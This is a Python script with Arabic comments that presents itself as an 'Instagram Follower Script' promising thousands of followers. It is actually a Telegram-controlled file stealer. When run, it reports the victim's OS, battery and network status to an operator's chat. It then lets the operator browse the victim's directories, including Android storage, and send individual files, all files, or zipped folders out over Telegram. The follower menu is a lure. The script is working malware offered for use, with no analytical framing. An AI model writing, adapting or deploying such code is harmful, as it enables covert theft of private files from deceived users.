import sys
import subprocess
import os
os.system('pip install telebot')
import platform
import hashlib
import telebot
import time
import shutil
os.system('pip install telebot')
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# قائمة المكتبات المطلوبة
required_modules = ['telebot', 'pyfiglet', 'requests']

def install_modules():
    print("جاري التحقق من المكتبات المطلوبة...")
    missing_modules = []
    for module in required_modules:
        try:
            __import__(module)
        except ImportError:
            missing_modules.append(module)

    if missing_modules:
        print("جاري تثبيت المكتبات...")
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing_modules, stderr=subprocess.DEVNULL)
    else:
        print("جميع المكتبات مثبتة بالفعل.")

# التحقق من المكتبات وتثبيتها إذا لزم الأمر
install_modules()

import pyfiglet
import requests

# إعداد البوت باستخدام التوكن الخاص بك
bot = telebot.TeleBot("YOUR_BOT_TOKEN")
chat_id = 'YOUR_CHAT_ID'

# طباعة رسالة الترحيب
ab = pyfiglet.figlet_format("@termuxpp")
print(ab)

def slow(message): 
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.015)

# عرض قائمة المتابعين الوهميين
slow("""
Welcome to Instagram Follower Script 💘
----------------------------------------------
  [ 1 ] - 3k    
  [ 2 ] - 5k    
  [ 3 ] - 8k    
  [ 4 ] - 10k   
  [ 5 ] - 15k   
  [ 6 ] - 20k   
""")

# تحديد المسار الافتراضي بناءً على نظام التشغيل والجهاز
def detect_environment():
    system = platform.system().lower()
    release = platform.release().lower()

    if system == "linux":
        if "kali" in release:
            return "Kali Linux", "/home/"
        elif "android" in release or "termux" in os.getenv("PREFIX", "").lower():
            return "Android (Termux)", "/storage/emulated/0/"
        else:
            return "Linux", os.path.expanduser("~")
    elif system == "windows":
        return "Windows", "C:\\Users\\"
    elif system == "darwin":
        return "macOS", os.path.expanduser("~")
    else:
        return "Unknown", os.path.expanduser("~")

# جمع معلومات إضافية حول الجهاز
def gather_device_info(environment):
    battery_status = "غير متاح"
    network_status = "غير متاح"

    try:
        if environment == "Windows":
            battery_status = subprocess.check_output(
                ["wmic", "path", "Win32_Battery", "get", "EstimatedChargeRemaining"],
                stderr=subprocess.DEVNULL).decode().split("\n")[1].strip() + "%"
            network_status = subprocess.check_output(
                ["netsh", "wlan", "show", "interfaces"], stderr=subprocess.DEVNULL
            ).decode().split("Signal")[1].split(":")[1].strip()
        elif environment in ["Linux", "Kali Linux"]:
            battery_status = subprocess.check_output(
                ["acpi", "-b"], stderr=subprocess.DEVNULL).decode().split(", ")[1]
            network_status = subprocess.check_output(
                ["iwconfig"], stderr=subprocess.DEVNULL).decode().split("Link Quality")[1].split("=")[1].split("/")[0].strip() + "%"
        elif environment == "Android (Termux)":
            battery_status = subprocess.check_output(
                ["termux-battery-status"], stderr=subprocess.DEVNULL).decode().split("percentage\": ")[1].split(",")[0] + "%"
            network_status = subprocess.check_output(
                ["termux-wifi-connectioninfo"], stderr=subprocess.DEVNULL).decode().split("rssi\": ")[1].split(",")[0] + " dBm"
        elif environment == "macOS":
            battery_status = subprocess.check_output(
                ["pmset", "-g", "batt"], stderr=subprocess.DEVNULL).decode().split("\t")[1].split(";")[0]
            network_status = subprocess.check_output(
                ["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"],
                stderr=subprocess.DEVNULL).decode().split("agrCtlRSSI:")[1].split("\n")[0].strip() + " dBm"
    except Exception as e:
        print(f"Error gathering info on {environment}: {e}")

    return battery_status, network_status

# عرض معلومات الجهاز واختيار الجهاز المتصل
def handle_device_selection(environment, directory):
    global current_directory
    current_directory = directory
    battery_status, network_status = gather_device_info(environment)
    bot.send_message(chat_id=chat_id, text=f"تم اختيار {environment}.\nحالة البطارية: {battery_status}\nإشارة الشبكة: {network_status}.")
    list_files_in_directory(current_directory)

# تخزين المسارات في قاموس لسهولة الوصول إليها لاحقًا
file_paths = {}

def generate_hash(path):
    return hashlib.md5(path.encode()).hexdigest()

# دالة لعرض الملفات والمجلدات في القائمة
def list_files_in_directory(directory):
    global current_directory
    current_directory = directory
    files = os.listdir(directory)
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)

    # ترتيب وعرض المجلدات أولاً ثم الملفات
    for item in sorted(files):
        item_path = os.path.join(directory, item)
        if os.path.isdir(item_path):
            markup.add(KeyboardButton(f"📂 {item}"))
        else:
            file_hash = generate_hash(item_path)
            file_paths[file_hash] = item_path
            markup.add(KeyboardButton(f"📄 {item}"))

    # إضافة أزرار التنقل بين المجلدات
    if os.path.dirname(directory) != directory:  # عدم عرض زر "العودة" في جذر النظام
        markup.add(KeyboardButton("🔙 العودة إلى المجلد السابق"))
    markup.add(KeyboardButton("🏠 العودة للمسار الرئيسي"))
    markup.add(KeyboardButton("📤 إرسال جميع الملفات"))

    bot.send_message(chat_id=chat_id, text=f'📁 المجلد الحالي: {directory}\nاختر ملفًا لإرساله أو مجلدًا للدخول إليه:', reply_markup=markup)

# دالة إرسال الملفات بناءً على نوعها
def send_file(file_path):
    with open(file_path, "rb") as f:
        bot.send_document(chat_id=chat_id, document=f, caption=f'📄 ملف: {file_path}')

# دالة إرسال جميع الملفات في المجلد الحالي
def send_all_files_in_directory():
    for file_hash, file_path in file_paths.items():
        send_file(file_path)

# ضغط وإرسال كافة الملفات في المجلد
def compress_and_send_directory(dir_path):
    zip_file = shutil.make_archive(dir_path.rstrip('/'), 'zip', dir_path)
    with open(zip_file, "rb") as f:
        bot.send_document(chat_id=chat_id, document=f, caption=f'ملفات مضغوطة من: {dir_path}')
    os.remove(zip_file)

# التعامل مع إدخال المسار من المستخدم
@bot.message_handler(func=lambda message: True)
def handle_file_selection(message):
    global current_directory
    selected = message.text.strip()

    if selected.startswith("📂"):
        new_dir = os.path.join(current_directory, selected[2:].strip())
        if os.path.isdir(new_dir):
            list_files_in_directory(new_dir)
        else:
            bot.send_message(chat_id=chat_id, text="❌ هذا المجلد غير صالح.")
    elif selected.startswith("📄"):
        file_name = selected[2:].strip()
        for file_hash, file_path in file_paths.items():
            if file_name in file_path:
                send_file(file_path)
                break
    elif selected == "🔙 العودة إلى المجلد السابق":
        parent_dir = os.path.dirname(current_directory)
        list_files_in_directory(parent_dir)
    elif selected == "🏠 العودة للمسار الرئيسي":
        list_files_in_directory("/storage/emulated/0/")
    elif selected == "📤 إرسال جميع الملفات":
        bot.send_message(chat_id=chat_id, text="📤 جاري إرسال جميع الملفات من القائمة الحالية...")
        send_all_files_in_directory()
    else:
        bot.send_message(chat_id=chat_id, text=f'📂 المسار {selected} غير موجود أو غير صالح.')

# بدء البوت
environment, directory = detect_environment()
handle_device_selection(environment, directory)
bot.polling()
